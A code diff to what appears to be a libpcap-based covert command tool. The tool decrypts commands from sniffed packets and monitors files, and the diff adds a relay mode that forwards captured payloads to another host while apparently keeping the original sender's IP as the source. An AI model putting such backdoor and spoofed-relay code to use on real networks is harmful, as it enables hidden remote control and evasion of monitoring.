@@ -2,6 +2,8 @@
 
 /*static void set_done_flag (int);*/
 static volatile sig_atomic_t doneflag = 0;
+int dest_relay_port, relay_mode = FALSE;
+char relay_host[BUFFER];
 /*--------------------------------------------------------------------------------------------------------------------
 -- FUNCTION: startPacketCapture
 -- 
@@ -19,7 +21,9 @@ static volatile sig_atomic_t doneflag = 0;
 -- 
 -- NOTES: Initializes packet capture on dst port or src host based on protocol
 ----------------------------------------------------------------------------------------------------------------------*/
-int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol){
+int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, 
+		       char * listen_host, int listen_port, char * dest_host, int dest_port, int protocol)
+{
 	
 	char nic_dev[BUFFER];		// NIC device name to monitor
 	pcap_if_t *alldevs, *temp; 	// NIC list variables
@@ -60,15 +64,15 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char 
 	}
 
 	/* Compiling the filter expression */
-	if(dst == FROM_CLIENT && protocol == TCP_PROTOCOL)
-		sprintf(filter_exp, "tcp and dst port %d", port);
+	if((dst == FROM_RELAY || dst == FROM_CLIENT) && protocol == TCP_PROTOCOL)
+		sprintf(filter_exp, "tcp and dst port %d", listen_port);
 	if(dst == FROM_SERVER && protocol == TCP_PROTOCOL)	
-		sprintf(filter_exp, "tcp and src host %s", src_host);
-	if(dst == FROM_CLIENT && protocol == UDP_PROTOCOL)
-		sprintf(filter_exp, "udp and dst port %d", port);
+		sprintf(filter_exp, "tcp and src host %s", listen_host);
+	if((dst == FROM_RELAY || dst == FROM_CLIENT) && protocol == UDP_PROTOCOL)
+		sprintf(filter_exp, "udp and dst port %d", listen_port);
 	if(dst == FROM_SERVER && protocol == UDP_PROTOCOL)
-		sprintf(filter_exp, "udp and src host %s", src_host);	
-	
+		sprintf(filter_exp, "udp and src host %s", listen_host);
+
 	if(pcap_compile(nic_descr, &fp, filter_exp, 0, netp))
 	{
 		fprintf(stderr, "Cannot parse expression filter\n");
@@ -79,6 +83,13 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char 
 	{
 		fprintf(stderr, "Cannot set filter\n");
 		exit(1);
+	}
+	
+	if(dst == FROM_RELAY)
+	{
+		dest_relay_port = dest_port;
+		strcpy(relay_host, dest_host);
+		relay_mode = TRUE;
 	}
 
 	/* Use callback to process packets */
@@ -194,6 +205,12 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
+	if(relay_mode == TRUE)
+	{
+		relayPacket((char *)payload, size_payload, inet_ntoa(ip->ip_src), relay_host, dest_relay_port, ip->ip_p);
+		return;
+	}
+
 	command = malloc((PKT_SIZE + 1) * sizeof(char));
 	datalen = parse_cmd(command, decrypted, size_payload);
 
@@ -273,6 +290,15 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	}
 
 }
+
+int relayPacket(char * payload, int size_payload,  const char * src_ip, 
+		const char * dest_ip, const int dest_port, int protocol)
+{
+	send_packet(payload, protocol, size_payload, src_ip, dest_ip, dest_port);
+	return 0;
+}
+
+
 /*--------------------------------------------------------------------------------------------------------------------
 -- FUNCTION: parse_cmd
 -- 
@@ -576,8 +602,4 @@ int initFileMonitor(struct filelist* folder, const char* src_ip, const char* des
 		perror ("close");
 	return 0;
 }
-/*static void set_done_flag (int signo)
-{
-	doneflag = TRUE;
-}*/
 
